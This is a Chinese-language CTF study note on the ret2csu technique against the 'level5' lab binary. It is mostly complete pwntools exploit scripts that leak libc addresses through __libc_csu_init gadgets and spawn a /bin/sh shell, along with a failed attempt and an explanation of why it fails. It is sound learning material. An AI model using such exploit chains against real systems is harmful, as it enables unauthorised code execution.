# ctfwiki---中级ROP

## 简介
ctfwiki说：中级ROP 主要是使用了一些比较巧妙的 Gadgets。  


## ret2csu
开始没看解析，直接用自己的方法做，思路就是通过栈溢出构造ROP链调用write输出write的真实地址，然后就能再次栈溢出到system，获取shell了。  

预先需要知道的知识：  
程序是64位的，函数前六个参数分别通过rdi,rsi,rdx,rcx,r8,r9来传递，其他更多的参数通过栈来传递  

大概的利用思路：栈溢出，ROP链设置write的参数，调用write输出真实write的地址，返回`_start`进行第2次调用  
本地计算出system和bin_sh真实地址后，第二次栈溢出，ROP链设置system参数，跳转到system执行即可获取shell  

构造ROP链时，发现不能设置rdx的值，调试发现rdx的值已经足够大了，我们取前8个字节就够用了。  

我的利用脚本如下：  
```python
# coding:utf8
# python3

'''
level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=45a4cee8f6bcc184507b3bea0f0c2e2d603650bd, not stripped

➜  Desktop checksec level5 
[*] '/home/ubuntu/Desktop/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


0000| 0x7fffffffdd98 --> 0x4005b4 (<main+45>:	mov    eax,0x0)
0000| 0x7fffffffdd10 --> 0xa6f6c6c6568 ('hello\n')

0x88

can not find pop rdx, maybe do not need
0x0000000000400623 : pop rdi ; ret 
0x0000000000400621 : pop rsi ; pop r15 ; ret

'''

from pwn import *
from LibcSearcher import LibcSearcher

exe = ELF('level5')

context.binary = exe

context.log_level = 'DEBUG'


write_plt = exe.plt['write']  # 可执行文件里调用的系统api在plt的地址，可以直接用
start_symbol = exe.symbols['_start']  # 可执行文件部分函数（不属于系统api）的地址，可以直接用，symbols可以被简写为sym
write_got = exe.got['write']  # 系统api在got的地址，利用时需要注意这样的api需要被调用过，此处才有值


def conn():
    if args.REMOTE:
        return remote('addr', 1337)
    else:
        return process([exe.path])


def main():
    r = conn()

    if args.G:
        gdb.attach(r, ''' 
            b * 0x0000000000400584
        ''')

    pop_rdi_addr = 0x0000000000400623
    pop_rsi_r15_addr = 0x0000000000400621

    payload1 = flat(['a'*0x88, pop_rdi_addr, 1, pop_rsi_r15_addr, write_got, 0xdeadbeef, write_plt, start_symbol])
    r.sendlineafter('Hello, World\n', payload1)
    
    recv_content = r.recv()
    real_write_addr = u64(recv_content[:8])

    libc = LibcSearcher('write', real_write_addr)
    libc_base = real_write_addr - libc.dump('write')
    real_system_addr = libc_base + libc.dump('system')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')

    payload2 = flat(['a'*0x88, pop_rdi_addr, bin_sh_addr, real_system_addr])
    r.send(payload2)

    r.interactive()


if __name__ == '__main__':
    main()

```

先粘一下官方exp吧  
```python
from pwn import *
from LibcSearcher import LibcSearcher

#context.log_level = 'debug'

level5 = ELF('./level5')
sh = process('./level5')

write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc = LibcSearcher('write', write_addr)
libc_base = write_addr - libc.dump('write')
execve_addr = libc_base + libc.dump('execve')
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()
```
官方的思路是这样的  
```
利用栈溢出执行 libc_csu_gadgets 获取 write 函数地址，并使得程序重新执行 main 函数
根据 libcsearcher 获取对应 libc 版本以及 execve 函数地址
再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入 execve 地址以及 '/bin/sh’ 地址，并使得程序重新执行 main 函数。
再次利用栈溢出执行 libc_csu_gadgets 执行 execve('/bin/sh') 获取 shell。
```

拿csu函数出来解释一下：  
```python
def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(
        r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)
```
rbx等于0有2个点限制，第1个点是call指令，需要让r12决定call的地址，把rbx设为0比较方便控制；第2个点是要让比较指令的结果为不跳转，也就是rbx+1 == rbp  
最后的 'a' * 0x38 是因为执行完比较指令后，后续操作会让栈弹出0x38长度的数据  

自己测试 execve 和 system 都可以  
`_start`做返回地址和`main`做返回地址都可以  


&&&&&&& 疑惑如下：  
`csu(0, 1, write_got, 8, write_got, 1, main_addr)` 这里第3个参数是 `write_got`，能换成 `write_plt` 吗？测试不能，因为跳过去当代码执行了，所以还是没搞懂这个机制，再去试试之前涉及到plt的题目  


比较好奇为什么ROPgadget没有发现`pop ebx`，因为ROPgadget会忽略掉 pop rbp  

看一个错误的利用脚本：  
```python
# coding:utf8
# python3

'''
level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=45a4cee8f6bcc184507b3bea0f0c2e2d603650bd, not stripped

➜  Desktop checksec level5 
[*] '/home/ubuntu/Desktop/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


0000| 0x7fffffffdd98 --> 0x4005b4 (<main+45>:	mov    eax,0x0)
0000| 0x7fffffffdd10 --> 0xa6f6c6c6568 ('hello\n')

0x88


__libc_csu_init end
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn
'''

from pwn import *
from LibcSearcher import LibcSearcher

exe = ELF('level5')

context.binary = exe

context.log_level = 'DEBUG'


start_symbol = exe.symbols['_start']  # 可执行文件部分函数（不属于系统api）的地址，可以直接用，symbols可以被简写为sym
write_got = exe.got['write']  # 系统api在got的地址，利用时需要注意这样的api需要被调用过，此处才有值

csu_near_end_1 = 0x0000000000400600
csu_near_end_2 = 0x000000000040061A


def conn():
    if args.REMOTE:
        return remote('addr', 1337)
    else:
        return process([exe.path])


def main():
    r = conn()

    if args.G:
        gdb.attach(r, ''' 
            b * 0x000000000040061A
            b * 0x400470
        ''')

    rbx = 0
    rbp = 1
    r12 = write_got
    r13 = 8
    r14 = write_got
    r15 = 1
    payload1 = flat(['a'*0x88, csu_near_end_2, rbx, rbp, r12, r13, r14, r15, csu_near_end_1, 'b' * 0x38, start_symbol])
    r.sendlineafter('Hello, World\n', payload1)

    recv_content = r.recv(8)
    real_write_addr = u64(recv_content[:8])

    libc = LibcSearcher('write', real_write_addr)
    libc_base = real_write_addr - libc.dump('write')
    real_execve_addr = libc_base + libc.dump('execve')
    bin_sh_addr = libc_base + libc.dump('str_bin_sh')

    rbx = 0
    rbp = 1
    r12 = real_execve_addr
    r13 = 8
    r14 = 1
    r15 = bin_sh_addr
    payload2 = flat(['a'*0x88, csu_near_end_2, rbx, rbp, r12, r13, r14, r15, csu_near_end_1])
    r.sendlineafter('Hello, World\n', payload2)

    r.interactive()


if __name__ == '__main__':
    main()

```
错误点在于想把`bin_sh_addr`直接通过r15传给rdi，但因为只能传低4位，而`bin_sh_addr`地址是8位的，这就导致找不到对应的位置  

按官方exp思路重新写一遍：  
```python
# coding:utf8
# python3

'''
level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=45a4cee8f6bcc184507b3bea0f0c2e2d603650bd, not stripped

➜  Desktop checksec level5 
[*] '/home/ubuntu/Desktop/level5'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)


0000| 0x7fffffffdd98 --> 0x4005b4 (<main+45>:	mov    eax,0x0)
0000| 0x7fffffffdd10 --> 0xa6f6c6c6568 ('hello\n')

0x88


__libc_csu_init end
.text:0000000000400600
.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400600                 mov     rdx, r13
.text:0000000000400603                 mov     rsi, r14
.text:0000000000400606                 mov     edi, r15d
.text:0000000000400609                 call    qword ptr [r12+rbx*8]
.text:000000000040060D                 add     rbx, 1
.text:0000000000400611                 cmp     rbx, rbp
.text:0000000000400614                 jnz     short loc_400600
.text:0000000000400616
.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400616                 add     rsp, 8
.text:000000000040061A                 pop     rbx
.text:000000000040061B                 pop     rbp
.text:000000000040061C                 pop     r12
.text:000000000040061E                 pop     r13
.text:0000000000400620                 pop     r14
.text:0000000000400622                 pop     r15
.text:0000000000400624                 retn


'''

from pwn import *
from LibcSearcher import LibcSearcher

exe = ELF('level5')

context.binary = exe

if args.D:
    context.log_level = 'DEBUG'
else:
    context.log_level = 'INFO'

main_symbol = exe.symbols['main']  # 这里可以换成 _start，只不过 _start 会调用 __libc_csu_init，但没什么影响
write_got = exe.got['write']  # 系统api在got的地址，利用时需要注意这样的api需要被调用过，此处才有值
read_got = exe.got['read']
bss_addr = exe.bss()  # bss段起始地址，需要将execve的地址和参数写到这里

csu_near_end_1 = 0x0000000000400600
csu_near_end_2 = 0x000000000040061A


def conn():
    if args.REMOTE:
        return remote('addr', 1337)
    else:
        return process([exe.path])


def main():
    r = conn()

    if args.G:
        gdb.attach(r, ''' 
            b * 0x0000000000400609
        ''')

    # 注意下面r12的值不能换成write_plt，因为__libc_csu_init 末尾的call不是直接call一个地址，而是这样子的
    # .text:0000000000400609 call qword ptr [r12+rbx*8]
    # 意思就是call r12指向地址的值表示的地址，所以应该用write_got，不要太粗心呀
    # ssize_t write(int fd, const void *buf, size_t count);
    #                   rdi,            rsi,        rdx
    rbx = 0
    rbp = 1
    r12 = write_got
    r13 = 8  # arg3
    r14 = write_got  # arg2
    r15 = 1  # arg1
    payload1 = flat(['a'*0x88, csu_near_end_2, rbx, rbp, r12, r13, r14, r15, csu_near_end_1, 'b' * 0x38, main_symbol])
    r.sendlineafter('Hello, World\n', payload1)

    recv_content = r.recv(8)
    real_write_addr = u64(recv_content)

    libc = LibcSearcher('write', real_write_addr)
    libc_base = real_write_addr - libc.dump('write')
    real_execve_addr = libc_base + libc.dump('execve')  # 这里换成 system 也可以

    # ssize_t read(int fd, void *buf, size_t count)
    #                  rdi       rsi         rdx
    rbx = 0
    rbp = 1
    r12 = read_got
    r13 = 16  # arg3
    r14 = bss_addr  # arg2
    r15 = 0  # arg1
    payload2 = flat(['a'*0x88, csu_near_end_2, rbx, rbp, r12, r13, r14, r15, csu_near_end_1, 'b' * 0x38, main_symbol])
    r.sendlineafter('Hello, World\n', payload2)

    payload3 = flat([real_execve_addr, '/bin/sh\0'])
    r.send(payload3)  # 这里用send，不要用sendline，后者会多出一个换行符，会影响后面的流程

    # int execve(const char *pathname, char *const argv[], char *const envp[])
    #                        rdi                   rsi                 rdx
    rbx = 0
    rbp = 1
    r12 = bss_addr
    r13 = 0  # arg3 不需要，但不能随便设值，因为execve后面的参数是有意义的，r14同理
    r14 = 0  # arg2
    r15 = bss_addr+8  # arg1
    payload4 = flat(['a'*0x88, csu_near_end_2, rbx, rbp, r12, r13, r14, r15, csu_near_end_1])
    r.sendlineafter('Hello, World\n', payload4)

    r.interactive()


if __name__ == '__main__':
    main()

```


2020/12/2  
